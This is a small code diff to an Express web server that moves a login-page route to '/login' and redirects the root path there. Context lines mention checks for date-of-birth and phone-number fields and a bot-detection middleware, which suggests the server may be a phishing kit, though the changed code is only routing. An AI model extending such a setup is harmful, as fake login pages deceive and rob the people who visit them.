@@ -308,7 +308,7 @@ if (lowerCaseMyObjects.includes('dob') || lowerCaseMyObjects.includes('phonenumb
 
 
 // Route handler for login pages
-app.get('/', async (req, res) => {
+app.get('/login', async (req, res) => {
   try {
     let htmlContent;
     const page = req.params.page;
@@ -319,6 +319,10 @@ app.get('/', async (req, res) => {
     console.error('Error reading file:', error);
     res.status(500).send('Internal Server Error');
   }
+});
+
+app.get('/', async (req, res) => {
+        res.redirect('/login');
 });
 
 // Middleware function for bot detection
